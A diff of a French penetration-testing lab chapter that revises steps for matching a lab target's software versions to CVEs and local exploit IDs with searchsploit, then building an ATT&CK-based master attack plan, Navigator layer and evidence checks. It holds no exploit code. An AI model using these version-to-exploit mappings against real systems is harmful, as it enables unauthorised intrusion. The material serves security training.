 - `CVE-2011-3192` : résultats `Apache - Denial of Service` (`18221.c`, `17696.pl`). Attaque de disponibilité, **non exécutée**.
 - `CVE-2012-1823` : résultats `Apache + PHP < 5.3.12 / < 5.4.2 - cgi-bin Remote Code Execution`. Condition : CGI activé. La cible a `php5-cgi` mais `/cgi-bin/` renvoie `403` dans notre test. Candidat **conditionnel**, non validé.
 - `CVE-2008-0166` : résultats `OpenSSL 0.9.8c-1 < 0.9.8g-9 (Debian and Derivatives) - Predictable PRNG`. La cible a `openssl 0.9.8g-4ubuntu3`, dans la plage. Candidat **validé pour la version**, sans exécution.
 
-**Explication de la commande** — CVE-2011-3192 est une attaque par déni de service : documentée, non exécutée. CVE-2012-1823 est conditionnelle à l'activation de CGI ; `/cgi-bin/` renvoie `403` dans notre test, donc le candidat n'est pas validé. CVE-2008-0166 est validée pour la version OpenSSL, sans exécution.
+**Preuve** — `preuves/ch1-lab2/searchsploit-cve-2011-3192.txt`, `searchsploit-cve-2012-1823.txt` et `searchsploit-cve-2008-0166.txt`.
 
-**Étape 12** — Consigner la matrice et les preuves.
+#### Étape 12 — Consigner la matrice et les preuves
+
+**But** — vérifier que chaque preuve contient un code retour et produire une empreinte d'intégrité de l'ensemble.
+
+**Machine** — Kali `192.168.56.101`.
+
+**Prérequis** — preuves des étapes 1 à 11 présentes dans `preuves/ch1-lab2/`.
+
+> **Machine** : Kali (192.168.56.101) | **Terminal** : SSH depuis l'hôte | **Utilisateur** : kali | **Répertoire** : `/home/kali`
+
+**Exemple de commande**
 
 ```bash
 grep -H '^# rc=' preuves/ch1-lab2/*.txt
 sha256sum preuves/ch1-lab2/*.txt preuves/ch1-lab2/*.xml > preuves/ch1-lab2/SHA256SUMS
 ```
 
-Résultat attendu : un code retour par fichier et une empreinte SHA-256 par preuve.
+**Explication de la commande**
 
-**Explication de la commande** — Chaque preuve doit avoir un `# rc=`. Les fichiers `.txt` et `.xml` sont hachés. Piège courant : hacher les preuves avant d'ajouter le fichier `SHA256SUMS` lui-même ; le fichier de sommes ne doit pas s'inclure.
+- `grep -H '^# rc=' preuves/ch1-lab2/*.txt` : affiche le nom de chaque fichier et sa ligne de code retour.
+- `-H` : force l'affichage du nom du fichier, même avec un seul fichier.
+- `'^# rc='` : motif ancré en début de ligne, qui évite de confondre avec une sortie d'outil.
+- `preuves/ch1-lab2/*.txt` : ensemble des preuves texte du lab.
+- `sha256sum ... > preuves/ch1-lab2/SHA256SUMS` : calcule les empreintes et les écrit dans un fichier.
+- `*` : glob des fichiers `.txt` et `.xml` ; le fichier `SHA256SUMS` n'existe pas encore au moment du calcul et ne s'inclut donc pas.
+- Piège courant : relancer `sha256sum` après avoir créé `SHA256SUMS` en incluant `SHA256SUMS` lui-même ; le fichier de sommes ne doit pas s'inclure.
+
+**Résultat attendu**
+
+Un code retour par fichier et une empreinte SHA-256 par preuve.
+
+**Preuve** — `preuves/ch1-lab2/SHA256SUMS`.
+
+### En conclusion
+
+Vous avez une méthode reproductible : empreinte, recherche locale, candidat, validation de version, statut. Le Lab-03 organise ces résultats dans le plan d'attaque maître et la couche Navigator.
 
 ```mermaid
 flowchart LR
@@ -1107,9 +1357,7 @@ flowchart LR
 
 **Fig 7.1** — Chaîne de validation d'un candidat CVE hors ligne. La décision centrale est la comparaison entre la version observée et la plage de versions du titre de l'exploit.
 
-**Conclusion.** Vous avez une méthode reproductible : empreinte -> recherche locale -> candidat -> validation de version -> statut. Le Lab-03 organise ces résultats dans le plan d'attaque maître et la couche Navigator.
-
-### 7.5 Tableau de validation attendu
+**Tableau de validation attendu**
 
 | Service | Version observée | CVE candidate | Exploit local | Validation | Motif |
 |---|---|---|---|---|---|
@@ -1126,7 +1374,7 @@ flowchart LR
 | Noyau Linux | 2.6.24-16-server | CVE-2008-0600/0010/0009 | 5092 | candidat | plage `2.6.17 < 2.6.24.1` |
 | Noyau Kali | 7.1.5+kali-amd64 | — | — | non vérifiable | aucun résultat local |
 
-### 7.6 Critères de réussite
+**Critères de réussite**
 
 - [ ] `searchsploit -h` est exécuté et son `rc=2` est expliqué.
 - [ ] Les quatre CVE de référence sont recherchées avec `--cve`.
@@ -1139,32 +1387,25 @@ flowchart LR
 - [ ] La matrice de validation contient au moins 10 lignes.
 - [ ] La recherche reste passive ; tous les exploits sont exécutés dans le lab sans limitation (Lab-07).
 
-## 8. Lab-03 — Plan d'attaque maître et couche Navigator
+Le Lab-03 reprend ce tableau pour construire le plan d'attaque maître, le journal d'exécution et la couche Navigator.
 
-### 8.1 Contexte et objectif
+## Lab-03 — Plan d'attaque maître et couche Navigator
+
+### Énoncé / Contexte
 
 Le plan d'attaque maître est le document qui **autorise et encadre** les labs. Il ne déclenche aucune attaque. Il relie chaque technique ATT&CK à un lab, une cible, une preuve, une détection, une mitigation et un rollback. La couche Navigator est la représentation visuelle de ce plan.
 
 **Place dans la chaîne** — après la recherche de vulnérabilités (Lab-02), avant la baseline et la première phase d'exécution (Lab-04).
 
-À la fin de ce lab, vous devez être capable de :
+**Objectifs pédagogiques** — à la fin de ce lab, vous devez être capable de :
+
 - produire un inventaire CSV d'au moins 40 techniques, sans doublon ;
 - conserver les identifiants legacy et expliquer la règle de fusion ;
 - générer une couche Navigator JSON valide et l'emporter dans l'outil ;
 - remplir un plan maître, un PV de gel, un journal d'exécution et une fiche dry-run ;
 - vérifier l'ensemble avec un script de contrôle qui retourne `PASS`.
 
-**Outils et commandes utilisées**
-
-| Outil | Commandes | Rôle |
-|---|---|---|
-| `python3` | `scripts/genere-inventaire.py`, `scripts/genere-navigator.py` | Génération CSV et couche Navigator |
-| `bash` | `scripts/verifie-lab3.sh` | Contrôle automatique du plan |
-| `jq` / `python3 -m json.tool` | Validation JSON | Vérification de la couche |
-| `sha256sum` | `sha256sum -c SHA256SUMS` | Intégrité des livrables |
-| `prouve` | `prouve preuves/ch1-lab3/... commande` | Journalisation des contrôles |
-
-### 8.2 Plan MITRE ATT&CK
+**Plan MITRE ATT&CK**
 
 | Élément | Valeur |
 |---|---|
@@ -1174,7 +1415,7 @@ Le plan d'attaque maître est le document qui **autorise et encadre** les labs. 
 | Contrôle défensif | Revue de plan, séparation des rôles, gel de version |
 | Détection | Modification du plan après gel, écart entre plan et journal |
 
-### 8.3 Prérequis et fichiers fournis
+**Prérequis et fichiers fournis**
 
 - `chapitre-01.md` (ce document) pour extraire les tableaux de techniques.
 - Python 3.8 ou supérieur.
@@ -1190,9 +1431,9 @@ Le plan d'attaque maître est le document qui **autorise et encadre** les labs. 
   - `scripts/verifie-lab3.sh`.
 - Répertoire de travail : `preuves/ch1-lab3/`.
 
-> **Autoportance** — si les fichiers `modeles/` et `scripts/` ne sont pas présents, les sections 8.3.1 à 8.3.3 donnent le contenu minimal pour reconstruire l'inventaire, la couche Navigator et le plan. Le contrôle final reste identique.
+> **Autoportance** — si les fichiers `modeles/` et `scripts/` ne sont pas présents, les blocs autoportants de ce lab (séquencement de référence, modèle de ligne d'inventaire et couche Navigator minimale) donnent le contenu nécessaire pour reconstruire l'inventaire, la couche Navigator et le plan. Le contrôle final reste identique.
 
-#### 8.3.1 Séquencement de référence des 24 labs
+**Séquencement de référence des 24 labs**
 
 | # | Lab | Techniques principales |
 |---|---|---|
@@ -1223,7 +1464,7 @@ Le plan d'attaque maître est le document qui **autorise et encadre** les labs. 
 
 > **Extension Lab-07/08** — le séquencement de référence reste celui des **24 entrées** du plan maître v1.0. Les labs d'exploitation ajoutés dans cette version sont documentés comme **avenant A.7** : ils ne renumérotent pas le plan, ne suppriment aucune entrée et ne modifient pas rétroactivement les statuts des chapitres 2 à 5. La checklist de remise vérifie les deux périmètres : 24 entrées de référence + avenant A.7.
 
-#### 8.3.2 Modèle de ligne d'inventaire
+**Modèle de ligne d'inventaire**
 
 ```csv
 id,technique,tactique,tactic_slug,chapitre_lab,statut,chapitre_reference,statut_par_chapitre,couleur,remplace_par
@@ -1232,7 +1473,7 @@ T1046,Network Service Discovery,Discovery,discovery,Ch1 Lab1; Ch1 Lab4; Ch1 Lab5
 
 La règle de fusion est celle du modèle : une ligne par `id`, l'historique dans `statut_par_chapitre`, le statut de référence dans `statut`.
 
-#### 8.3.3 Couche Navigator minimale
+**Couche Navigator minimale**
 
 Si `scripts/genere-navigator.py` est absent, ce bloc produit une couche importable :
 
@@ -1255,9 +1496,29 @@ print(len(tech), "techniques")
 PY
 ```
 
-### 8.4 Étapes
+### Outils et commandes utilisées
 
-**Étape 1** — Créer le répertoire de travail et copier les modèles.
+| Outil | Commande | Rôle |
+|---|---|---|
+| `python3` | `scripts/genere-inventaire.py`, `scripts/genere-navigator.py` | Génération CSV et couche Navigator |
+| `bash` | `scripts/verifie-lab3.sh` | Contrôle automatique du plan |
+| `jq` / `python3 -m json.tool` | Validation JSON | Vérification de la couche |
+| `sha256sum` | `sha256sum -c SHA256SUMS` | Intégrité des livrables |
+| `prouve` | `prouve preuves/ch1-lab3/... commande` | Journalisation des contrôles |
+
+### Commande et laboratoire étape par étape
+
+#### Étape 1 — Créer le répertoire de travail et copier les modèles
+
+**But** — isoler les livrables du Lab-03 dans un répertoire dédié et vérifier que les modèles et les scripts sont présents avant de les exécuter.
+
+**Machine** — Kali `192.168.56.101`.
+
+**Prérequis** — répertoires `modeles/` et `scripts/` fournis avec le chapitre.
+
+> **Machine** : Kali (192.168.56.101) | **Terminal** : SSH depuis l'hôte | **Utilisateur** : kali | **Répertoire** : `/home/kali`
+
+**Exemple de commande**
 
 ```bash
 mkdir -p preuves/ch1-lab3
@@ -1267,28 +1528,69 @@ cd preuves/ch1-lab3
 ls modeles scripts
 ```
 
-Résultat attendu : les fichiers `plan-attaque-maitre.md`, `PV-gel-plan-v1.0.md`, `journal-execution.csv`, `fiche-dry-run.md` et les trois scripts sont présents.
+**Explication de la commande**
 
-**Explication de la commande** — Les modèles et scripts sont livrés avec le chapitre. Si un fichier manque, le contrôle échoue dès la première ligne. Piège courant : copier `modeles/` sans `scripts/`, puis appeler un script absent.
+- `mkdir -p preuves/ch1-lab3` : crée le répertoire de travail et ses parents sans erreur s'il existe déjà.
+- `cp -r modeles preuves/ch1-lab3/` : copie récursivement les modèles dans le répertoire de travail.
+- `cp -r scripts preuves/ch1-lab3/` : copie récursivement les scripts.
+- `cd preuves/ch1-lab3` : place le shell dans le répertoire de travail pour les étapes suivantes.
+- `ls modeles scripts` : vérifie la présence des fichiers copiés.
+- Piège courant : copier `modeles/` sans `scripts/`, puis appeler un script absent ; le contrôle échoue dès la première ligne.
 
-**Étape 2** — Générer l'inventaire à partir du chapitre.
+**Résultat attendu**
+
+Les fichiers `plan-attaque-maitre.md`, `PV-gel-plan-v1.0.md`, `journal-execution.csv`, `fiche-dry-run.md` et les trois scripts sont présents.
+
+**Preuve** — arborescence copiée dans `preuves/ch1-lab3/modeles/` et `preuves/ch1-lab3/scripts/`, contrôlée à l'étape 10 dans `preuves/ch1-lab3/verifie-lab3.txt`.
+
+#### Étape 2 — Générer l'inventaire à partir du chapitre
+
+**But** — produire le CSV des techniques à partir des tableaux de l'annexe A, avec expansion des sous-techniques et fusion des doublons.
+
+**Machine** — Kali `192.168.56.101`.
+
+**Prérequis** — étape 1 terminée ; répertoire courant `preuves/ch1-lab3`.
+
+> **Machine** : Kali (192.168.56.101) | **Terminal** : SSH depuis l'hôte | **Utilisateur** : kali | **Répertoire** : `/home/kali/preuves/ch1-lab3`
+
+**Exemple de commande**
 
 ```bash
 prouve genere-inventaire.txt \
   python3 scripts/genere-inventaire.py ../../chapitre-01.md inventaire-techniques.csv
 ```
 
-Résultat attendu :
+**Explication de la commande**
+
+- `prouve genere-inventaire.txt` : enregistre la sortie et le code retour du générateur.
+- `python3` : exécute le script avec l'interpréteur Python 3.
+- `scripts/genere-inventaire.py` : script de génération fourni avec le chapitre.
+- `../../chapitre-01.md` : source des tableaux A.1 à A.5, lue depuis le répertoire de travail.
+- `inventaire-techniques.csv` : fichier de sortie, en UTF-8 avec des fins de ligne `\n`.
+- Le script expanse les identifiants abrégés (`.002` devient `T1499.002`), applique la règle de fusion et ajoute les six identifiants legacy `T1043`, `T1075`, `T1418`, `T1452`, `T1493` et `T119`.
+- Piège courant : lancer le script depuis un autre répertoire ; le chemin `../../chapitre-01.md` ne pointe plus vers le chapitre.
+
+**Résultat attendu**
 
 ```text
 68 lignes ecrites dans inventaire-techniques.csv
 ```
 
-Le script lit les tableaux A.1 à A.5 de l'annexe A, expanse les identifiants abrégés (`.002` -> `T1499.002`) et applique la règle de fusion. Il ajoute les six identifiants legacy : `T1043`, `T1075`, `T1418`, `T1452`, `T1493`, `T119`.
+Le script lit les tableaux A.1 à A.5 de l'annexe A, expanse les identifiants abrégés et applique la règle de fusion. La règle évite les doublons : une technique peut apparaître dans plusieurs chapitres, mais une seule ligne est produite.
 
-**Explication de la commande** — Le générateur écrit 68 lignes. Il expanse les sous-techniques et fusionne les statuts. La règle de fusion évite les doublons : une technique peut apparaître dans plusieurs chapitres, mais une seule ligne est produite. Le fichier est en UTF-8 avec des fins de ligne `\n`.
+**Preuve** — `preuves/ch1-lab3/genere-inventaire.txt` et `preuves/ch1-lab3/inventaire-techniques.csv`.
 
-**Étape 3** — Contrôler l'en-tête, les doublons et les legacy.
+#### Étape 3 — Contrôler l'en-tête, les doublons et les legacy
+
+**But** — vérifier la structure du CSV, l'absence de doublon et la présence des six identifiants legacy.
+
+**Machine** — Kali `192.168.56.101`.
+
+**Prérequis** — `inventaire-techniques.csv` généré à l'étape 2.
+
+> **Machine** : Kali (192.168.56.101) | **Terminal** : SSH depuis l'hôte | **Utilisateur** : kali | **Répertoire** : `/home/kali/preuves/ch1-lab3`
+
+**Exemple de commande**
 
 ```bash
 head -1 inventaire-techniques.csv
@@ -1297,7 +1599,19 @@ grep -E '^T(1043|1075|1418|1452|1493|119),' inventaire-techniques.csv | cut -d, 
 wc -l inventaire-techniques.csv
 ```
 
-Résultat attendu :
+**Explication de la commande**
+
+- `head -1 inventaire-techniques.csv` : affiche la première ligne, c'est-à-dire l'en-tête.
+- `cut -d, -f1 inventaire-techniques.csv` : extrait la première colonne, l'identifiant de technique.
+- `tail -n +2` : supprime l'en-tête du flux.
+- `sort` : trie les identifiants pour rendre les doublons adjacents.
+- `uniq -d` : n'affiche que les identifiants présents au moins deux fois ; une sortie vide signifie aucun doublon.
+- `grep -E '^T(1043|1075|1418|1452|1493|119),'` : sélectionne les lignes des six legacy.
+- `cut -d, -f1` : affiche uniquement leur identifiant.
+- `wc -l inventaire-techniques.csv` : compte les lignes, en-tête compris.
+- Piège courant : oublier `tail -n +2` et compter l'en-tête comme un doublon.
+
+**Résultat attendu**
 
 ```text
 id,technique,tactique,tactic_slug,chapitre_lab,statut,chapitre_reference,statut_par_chapitre,couleur,remplace_par
@@ -1310,18 +1624,38 @@ T119
 69 inventaire-techniques.csv
 ```
 
-`uniq -d` ne doit rien afficher. `wc -l` affiche 69 lignes : 1 en-tête + 68 techniques.
+`uniq -d` ne doit rien afficher. `wc -l` affiche 69 lignes : 1 en-tête + 68 techniques. Les six legacy sont conservés pour la traçabilité, mais ne sont pas des identifiants ATT&CK valides au format actuel.
 
-**Explication de la commande** — L'en-tête contient 10 colonnes. `uniq -d` ne doit rien afficher. Les six legacy sont présents : ils sont conservés pour la traçabilité, mais ne sont pas des identifiants ATT&CK valides au format actuel.
+**Preuve** — `preuves/ch1-lab3/inventaire-techniques.csv`, contrôlé à l'étape 10 dans `preuves/ch1-lab3/verifie-lab3.txt`.
 
-**Étape 4** — Générer la couche Navigator.
+#### Étape 4 — Générer la couche Navigator
+
+**But** — transformer l'inventaire CSV en couche JSON importable dans MITRE ATT&CK Navigator, en excluant les identifiants qui ne respectent pas le format ATT&CK.
+
+**Machine** — Kali `192.168.56.101`.
+
+**Prérequis** — `inventaire-techniques.csv` contrôlé à l'étape 3.
+
+> **Machine** : Kali (192.168.56.101) | **Terminal** : SSH depuis l'hôte | **Utilisateur** : kali | **Répertoire** : `/home/kali/preuves/ch1-lab3`
+
+**Exemple de commande**
 
 ```bash
 prouve genere-navigator.txt \
   python3 scripts/genere-navigator.py inventaire-techniques.csv navigator-chapitres-1-5.json
 ```
 
-Résultat attendu :
+**Explication de la commande**
+
+- `prouve genere-navigator.txt` : enregistre la sortie du générateur et son code retour.
+- `python3` : exécute le script avec l'interpréteur Python 3.
+- `scripts/genere-navigator.py` : générateur de couche fourni avec le chapitre.
+- `inventaire-techniques.csv` : source des techniques.
+- `navigator-chapitres-1-5.json` : couche JSON de sortie.
+- Le script exclut les identifiants qui ne correspondent pas au motif `T` suivi de quatre chiffres ; `T119` est conservé dans le CSV pour l'historique mais exclu de la couche.
+- Piège courant : forcer `T119` dans la couche et produire un JSON que Navigator refuse.
+
+**Résultat attendu**
 
 ```text
 67 techniques ecrites dans navigator-chapitres-1-5.json
@@ -1330,9 +1664,19 @@ Lignes CSV ignorees (ID non ATT&CK) : 1 ['T119']
 
 T119 est conservé dans le CSV pour l'historique, mais exclu de la couche Navigator car son identifiant n'est pas au format `T` + quatre chiffres. C'est une décision documentée, pas un oubli.
 
-**Explication de la commande** — 67 techniques sont exportées. T119 est ignoré car il ne correspond pas au motif `T` + quatre chiffres. Cette décision est documentée dans la sortie du script et dans le plan. Piège courant : forcer T119 dans la couche et produire un JSON que Navigator refuse.
+**Preuve** — `preuves/ch1-lab3/genere-navigator.txt` et `preuves/ch1-lab3/navigator-chapitres-1-5.json`.
 
-**Étape 5** — Valider le JSON.
+#### Étape 5 — Valider le JSON
+
+**But** — vérifier que la couche est un JSON syntaxiquement valide et que son contenu structurel correspond à l'inventaire attendu.
+
+**Machine** — Kali `192.168.56.101`.
+
+**Prérequis** — `navigator-chapitres-1-5.json` généré à l'étape 4.
+
+> **Machine** : Kali (192.168.56.101) | **Terminal** : SSH depuis l'hôte | **Utilisateur** : kali | **Répertoire** : `/home/kali/preuves/ch1-lab3`
+
+**Exemple de commande**
 
 ```bash
 python3 -m json.tool navigator-chapitres-1-5.json > /dev/null
@@ -1346,7 +1690,17 @@ print("premiere:", d["techniques"][0]["techniqueID"])
 PY
 ```
 
-Résultat attendu :
+**Explication de la commande**
+
+- `python3 -m json.tool navigator-chapitres-1-5.json > /dev/null` : analyse le JSON et envoie la sortie reformatée vers `/dev/null`.
+- `> /dev/null` : supprime l'affichage du JSON reformaté ; seule l'erreur éventuelle reste visible.
+- `echo "JSON valide : $?"` : affiche le code retour de `json.tool`, `0` si le fichier est valide.
+- `python3 - <<'PY'` : exécute un script Python fourni sur l'entrée standard, sans créer de fichier.
+- `json.load(...)` : charge la couche et échoue si le JSON est invalide.
+- `d["name"]`, `len(d["techniques"])`, `d["techniques"][0]["techniqueID"]` : affichent le nom, le nombre de techniques et la première technique.
+- Piège courant : conclure à la validité sur le seul code retour sans vérifier le nombre de techniques et le contenu.
+
+**Résultat attendu**
 
 ```text
 JSON valide : 0
@@ -1355,39 +1709,90 @@ techniques: 67
 premiere: T1016
 ```
 
-**Explication de la commande** — `json.tool` retourne 0. La couche contient `name`, `versions`, `domain` et `techniques`. La première technique est `T1016` dans l'ordre du CSV. Si le JSON est invalide, Navigator affiche une erreur d'import.
+La couche contient `name`, `versions`, `domain` et `techniques`. La première technique est `T1016` dans l'ordre du CSV. Si le JSON est invalide, Navigator affiche une erreur d'import.
 
-**Étape 6** — Remplir le plan maître.
+**Preuve** — `preuves/ch1-lab3/navigator-chapitres-1-5.json`, validé à l'étape 10 dans `preuves/ch1-lab3/verifie-lab3.txt`.
+
+#### Étape 6 — Remplir le plan maître
+
+**But** — produire le plan maître complet à partir du modèle, sans champ entre crochets, avant le gel.
+
+**Machine** — Kali `192.168.56.101`.
+
+**Prérequis** — inventaire et couche Navigator générés ; modèle `modeles/plan-attaque-maitre.md` présent.
+
+> **Machine** : Kali (192.168.56.101) | **Terminal** : SSH depuis l'hôte | **Utilisateur** : kali | **Répertoire** : `/home/kali/preuves/ch1-lab3`
+
+**Exemple de commande**
 
 ```bash
 cp modeles/plan-attaque-maitre.md plan-attaque-maitre.md
 ```
 
-Complétez les champs entre crochets :
-- section 1 : date, auteur, validateur ;
-- section 3 : nombre de lignes, doublons, statuts ;
-- section 4 : statut des 14 tactiques ;
-- section 5 : vérifier les 24 entrées ;
-- section 7 : empreinte SHA-256 de la couche ;
-- section 8 : cases go/no-go ;
-- section 9 : signatures.
+**Explication de la commande**
 
-Résultat attendu : plus aucun `[ ]` ni `[AAAA-MM-JJ]` dans le fichier.
+- `cp` : copie le modèle vers le répertoire de travail.
+- `modeles/plan-attaque-maitre.md` : modèle fourni avec le chapitre.
+- `plan-attaque-maitre.md` : fichier à compléter ; il devient le livrable gelé.
+- Complétez ensuite les champs entre crochets :
+  - section 1 : date, auteur, validateur ;
+  - section 3 : nombre de lignes, doublons, statuts ;
+  - section 4 : statut des 14 tactiques ;
+  - section 5 : vérifier les 24 entrées ;
+  - section 7 : empreinte SHA-256 de la couche ;
+  - section 8 : cases go/no-go ;
+  - section 9 : signatures.
+- Piège courant : laisser la date de gel, le validateur ou l'empreinte SHA-256 vides ; un plan avec des `[ ]` n'est pas gelable.
 
-**Explication de la commande** — Le plan maître doit être complet avant le gel. Les champs les plus souvent oubliés sont la date de gel, le validateur et l'empreinte SHA-256. Un plan avec des `[ ]` n'est pas gelable.
+**Résultat attendu**
 
-**Étape 7** — Remplir le PV de gel.
+Plus aucun `[ ]` ni `[AAAA-MM-JJ]` dans le fichier.
+
+**Preuve** — `preuves/ch1-lab3/plan-attaque-maitre.md`, contrôlé à l'étape 10 dans `preuves/ch1-lab3/verifie-lab3.txt`.
+
+#### Étape 7 — Remplir le PV de gel
+
+**But** — figer les quatre fichiers du plan par leurs empreintes et consigner le gel dans un procès-verbal.
+
+**Machine** — Kali `192.168.56.101`.
+
+**Prérequis** — plan maître complété à l'étape 6 ; `journal-execution.csv` présent dans le répertoire de travail (copié depuis `modeles/` ; l'étape 8 le recopie pour l'initialisation).
+
+> **Machine** : Kali (192.168.56.101) | **Terminal** : SSH depuis l'hôte | **Utilisateur** : kali | **Répertoire** : `/home/kali/preuves/ch1-lab3`
+
+**Exemple de commande**
 
 ```bash
 cp modeles/PV-gel-plan-v1.0.md PV-gel-plan-v1.0.md
 sha256sum plan-attaque-maitre.md inventaire-techniques.csv journal-execution.csv navigator-chapitres-1-5.json
 ```
 
-Recopiez les quatre empreintes dans le PV. Le PV doit contenir la date de gel, le périmètre, la liste des fichiers gelés, les empreintes et les signatures.
+**Explication de la commande**
 
-**Explication de la commande** — Le PV de gel reprend les quatre empreintes. Si un fichier change après le gel, `sha256sum -c` échoue : c'est le comportement attendu. Un changement de commande impose un nouveau gel et un nouveau test.
+- `cp modeles/PV-gel-plan-v1.0.md PV-gel-plan-v1.0.md` : copie le modèle de PV dans le répertoire de travail.
+- `sha256sum` : calcule l'empreinte SHA-256 de chaque fichier.
+- `plan-attaque-maitre.md`, `inventaire-techniques.csv`, `journal-execution.csv` et `navigator-chapitres-1-5.json` : les quatre fichiers gelés.
+- Si `journal-execution.csv` n'existe pas encore, copiez-le depuis `modeles/` avant le calcul ; l'étape 8 le recopie pour l'initialisation.
+- Recopiez les quatre empreintes dans le PV, avec la date de gel, le périmètre, la liste des fichiers et les signatures.
+- Piège courant : modifier un fichier après le calcul ; `sha256sum -c` échoue alors, ce qui est le comportement attendu. Un changement de commande impose un nouveau gel et un nouveau test.
 
-**Étape 8** — Vérifier le journal d'exécution.
+**Résultat attendu**
+
+Quatre empreintes SHA-256 affichées, puis recopiées dans le PV.
+
+**Preuve** — `preuves/ch1-lab3/PV-gel-plan-v1.0.md` et les empreintes du PV, vérifiées à l'étape 11.
+
+#### Étape 8 — Vérifier le journal d'exécution
+
+**But** — initialiser le journal depuis le modèle et contrôler son en-tête, son nombre de lignes et la couverture des labs.
+
+**Machine** — Kali `192.168.56.101`.
+
+**Prérequis** — modèle `modeles/journal-execution.csv` présent.
+
+> **Machine** : Kali (192.168.56.101) | **Terminal** : SSH depuis l'hôte | **Utilisateur** : kali | **Répertoire** : `/home/kali/preuves/ch1-lab3`
+
+**Exemple de commande**
 
 ```bash
 cp modeles/journal-execution.csv journal-execution.csv
@@ -1396,7 +1801,18 @@ wc -l journal-execution.csv
 awk -F, 'NR>1 {print $6}' journal-execution.csv | sort | uniq -c
 ```
 
-Résultat attendu :
+**Explication de la commande**
+
+- `cp modeles/journal-execution.csv journal-execution.csv` : copie le modèle de journal dans le répertoire de travail.
+- `head -1 journal-execution.csv` : affiche uniquement l'en-tête, pour vérifier l'ordre des colonnes.
+- `wc -l journal-execution.csv` : compte les lignes, en-tête compris.
+- `awk -F, 'NR>1 {print $6}'` : découpe chaque ligne sur la virgule et affiche la sixième colonne, `cible`, pour toutes les lignes sauf l'en-tête.
+- `sort | uniq -c` : compte les occurrences de chaque valeur.
+- La couverture des labs se lit dans la cinquième colonne, `chapitre_lab` ; le comptage de la sixième colonne porte sur les cibles.
+- Les statuts autorisés sont `Planifié`, `En cours`, `Exécuté`, `Bloqué`. Une ligne sans preuve ni rollback n'est pas exécutable.
+- Piège courant : modifier l'ordre des colonnes ; le script de contrôle lit les colonnes par position.
+
+**Résultat attendu**
 
 ```text
 id,tactique,technique,sous_technique,chapitre_lab,cible,prerequis,outil_commande,resultat_attendu,preuve,detection,mitigation,statut,rollback,notes
@@ -1405,37 +1821,65 @@ id,tactique,technique,sous_technique,chapitre_lab,cible,prerequis,outil_commande
 
 Le journal contient 44 lignes d'étapes. La colonne `chapitre_lab` doit couvrir Ch1 Lab1 à Lab6.
 
-**Explication de la commande** — Le journal contient 44 lignes. La colonne `chapitre_lab` couvre Ch1 Lab1 à Lab6. Les statuts autorisés sont `Planifié`, `En cours`, `Exécuté`, `Bloqué`. Une ligne sans preuve ni rollback n'est pas exécutable.
+**Preuve** — `preuves/ch1-lab3/journal-execution.csv`, contrôlé à l'étape 10 dans `preuves/ch1-lab3/verifie-lab3.txt`.
 
-**Étape 9** — Remplir une fiche dry-run.
+#### Étape 9 — Remplir une fiche dry-run
+
+**But** — produire la fiche go/no-go d'une technique, avec commande exacte, preuve, détection, mitigation et rollback.
+
+**Machine** — Kali `192.168.56.101`.
+
+**Prérequis** — modèle `modeles/fiche-dry-run.md` présent ; technique `T1046` retenue dans le plan.
+
+> **Machine** : Kali (192.168.56.101) | **Terminal** : SSH depuis l'hôte | **Utilisateur** : kali | **Répertoire** : `/home/kali/preuves/ch1-lab3`
+
+**Exemple de commande**
 
 ```bash
 cp modeles/fiche-dry-run.md fiche-dry-run-T1046.md
 ```
 
-Complétez :
-- technique et sous-technique ;
-- cible et port ;
-- prérequis ;
-- commande exacte ;
-- résultat attendu ;
-- preuve attendue ;
-- détection ;
-- mitigation ;
-- rollback ;
-- critère go/no-go.
+**Explication de la commande**
 
-Résultat attendu : une fiche complète, sans case vide, pour la technique `T1046`.
+- `cp` : copie le modèle de fiche dry-run.
+- `modeles/fiche-dry-run.md` : modèle fourni avec le chapitre.
+- `fiche-dry-run-T1046.md` : fiche dédiée à la technique `T1046`.
+- Complétez ensuite : technique et sous-technique, cible et port, prérequis, commande exacte, résultat attendu, preuve attendue, détection, mitigation, rollback et critère go/no-go.
+- Piège courant : laisser le rollback vide ; une fiche sans rollback est refusée.
 
-**Explication de la commande** — La fiche dry-run est le contrôle go/no-go d'une étape. Elle doit contenir la commande exacte, le résultat attendu, la preuve, la détection, la mitigation et le rollback. Une fiche sans rollback est refusée.
+**Résultat attendu**
 
-**Étape 10** — Lancer le contrôle automatique.
+Une fiche complète, sans case vide, pour la technique `T1046`.
+
+**Preuve** — `preuves/ch1-lab3/fiche-dry-run-T1046.md`, contrôlé à l'étape 10 dans `preuves/ch1-lab3/verifie-lab3.txt`.
+
+#### Étape 10 — Lancer le contrôle automatique
+
+**But** — vérifier en une passe la présence, la structure et la cohérence des livrables du plan.
+
+**Machine** — Kali `192.168.56.101`.
+
+**Prérequis** — étapes 1 à 9 terminées ; livrables présents dans le répertoire de travail.
+
+> **Machine** : Kali (192.168.56.101) | **Terminal** : SSH depuis l'hôte | **Utilisateur** : kali | **Répertoire** : `/home/kali/preuves/ch1-lab3`
+
+**Exemple de commande**
 
 ```bash
 prouve verifie-lab3.txt bash scripts/verifie-lab3.sh .
 ```
 
-Résultat attendu :
+**Explication de la commande**
+
+- `prouve verifie-lab3.txt` : enregistre toute la sortie du contrôle dans une preuve.
+- `bash` : exécute le script avec l'interpréteur Bash.
+- `scripts/verifie-lab3.sh` : script de contrôle fourni avec le chapitre.
+- `.` : répertoire à contrôler, ici le répertoire de travail courant.
+- Le script vérifie la présence des fichiers, l'en-tête, le nombre de lignes, l'unicité, les legacy, le JSON et le nombre de techniques.
+- `RESULTAT: PASS` est la seule sortie acceptée ; si le script affiche `FAIL`, corrigez le fichier concerné, puis relancez.
+- Piège courant : lancer le script depuis `/home/kali` ; le `.` ne pointe alors pas vers les livrables.
+
+**Résultat attendu**
 
 ```text
 PASS  present: plan-attaque-maitre.md
@@ -1454,9 +1898,19 @@ INFO  techniques dans la couche: 67
 RESULTAT: PASS
 ```
 
-**Explication de la commande** — Le script vérifie la présence des fichiers, l'en-tête, le nombre de lignes, l'unicité, les legacy, le JSON et le nombre de techniques. `RESULTAT: PASS` est la seule sortie acceptée. Si le script affiche `FAIL`, corrigez le fichier concerné, puis relancez.
+**Preuve** — `preuves/ch1-lab3/verifie-lab3.txt`.
 
-**Étape 11** — Geler et archiver.
+#### Étape 11 — Geler et archiver
+
+**But** — produire les sommes de contrôle, vérifier l'intégrité, puis créer l'archive finale du plan.
+
+**Machine** — Kali `192.168.56.101`.
+
+**Prérequis** — étapes 1 à 10 terminées ; contrôle automatique `PASS`.
+
